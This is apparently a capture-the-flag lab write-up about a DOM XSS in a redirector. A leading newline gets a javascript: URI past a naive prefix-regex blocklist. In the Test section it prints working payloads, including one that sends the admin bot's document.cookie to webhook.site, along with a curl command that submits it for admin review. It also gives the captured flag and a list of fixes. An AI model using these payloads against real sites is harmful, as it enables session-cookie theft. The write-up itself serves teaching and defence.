# Bad Schema Pwnbox Lab - Control Character JavaScript Scheme Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: DOM XSS, scheme blocklist bypass, browser URL normalization, admin bot cookie exfil

## Observation

Redirector app at `https://ff9fd8860397.pwnbox-lab.com/`.

Initial page hints:

- "Paste a URL and we'll send you there — unless it looks dangerous."
- `filter = /^javascript:/i // blocks the dangerous schema`
- the same redirect input is accepted via `?redirect_uri=`
- a modal form reports a suspicious URL for admin review

Relevant inline JavaScript:

```javascript
function tryRedirect(redirectUri) {
    const regex = /^javascript:/i;

    if (regex.test(redirectUri)) {
        setStatus('Blocked: that schema is not allowed.', 'err');
        console.error('Invalid redirect_uri');
        return false;
    }

    setStatus('Redirecting to ' + redirectUri + ' …', 'ok');
    window.location.href = redirectUri;
    return true;
}
```

The page auto-loads `redirect_uri` from the query string on page load and passes it to `tryRedirect()`.

## Hypothesis

If the code only blocks strings that literally begin with `javascript:`, then leading whitespace or control characters may bypass the regex while the browser still normalizes the value into a `javascript:` URI at navigation time.

## Evidence

### The filter is a naive prefix blocklist

Only this pattern is blocked:

```javascript
/^javascript:/i
```

There is no `trim()`, no URL parsing, and no allowlist of safe schemes.

### Control-character-prefixed values reach the sink

In-browser evaluation showed:

```javascript
tryRedirect('\njavascript:alert(1)')
```

returned `true` and set the status message to:

```text
Redirecting to
javascript:alert(1) …
```

while:

```javascript
tryRedirect('javascript:alert(1)')
```

returned `false` with:

```text
Blocked: that schema is not allowed.
```

### Execution confirmed locally

Confirmed by using a side-effect payload:

```javascript
tryRedirect('\njavascript:document.body.setAttribute("data-pwned","1")')
```

Result:

```text
document.body.getAttribute("data-pwned") === "1"
```

This proves the browser normalized the leading newline and executed the `javascript:` URI despite the regex bypass.

### Same-origin admin report path exists

Posting a same-origin URL to `/` returned:

```text
URL reported — an admin will review it shortly.
```

## Test

Minimal bypass pattern:

```text
https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript:alert(1)
```

Flag exfil payload:

```text
https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript:fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))
```

Report submission:

```bash
curl -sS -X POST "https://ff9fd8860397.pwnbox-lab.com/" \
  -d "url=https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript%3Afetch%28%27https%3A%2F%2Fwebhook.site%2F[uuid]%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29"
```

## Result

Webhook received:

```text
flag=pwnbox{8dcc91bbfddb62beae3bc8c9aca87ce0}
```

The execution chain was:

```text
attacker-controlled redirect_uri
-> leading newline bypasses /^javascript:/i
-> window.location.href assigned raw value
-> browser normalizes to javascript: URI
-> admin bot executes script
-> document.cookie exfiltrated
```

## Conclusion

Confirmed DOM XSS via a control-character-prefixed `javascript:` URI. The blocklist validates the raw string before normalization, but the browser executes the normalized scheme after navigation. The admin review flow provides the victim context needed to extract the flag cookie.

## Root Cause

- The input validation uses a literal-prefix blocklist instead of positive scheme validation.
- The value is not trimmed or parsed before the check.
- The sink directly assigns user input to `window.location.href`.

## Failed Assumptions

- Blocking `javascript:` at the start of the string is not enough when browsers normalize leading control characters.
- Case-insensitive matching does not help if the dangerous scheme can be shifted away from byte 0.

## Working Theory

The developer recognized `javascript:` as dangerous but trusted a regex against the unnormalized string. Browser URL handling is more permissive than the filter, so a prefixed control character creates a parser mismatch.

## Flag

`pwnbox{8dcc91bbfddb62beae3bc8c9aca87ce0}`

## Fix

- Trim and normalize the candidate before validation.
- Parse with `new URL()` and enforce an allowlist of safe schemes such as `https:`.
- Reject non-network schemes including `javascript:` and `data:`.
- Avoid assigning attacker-controlled strings directly to `location.href`.
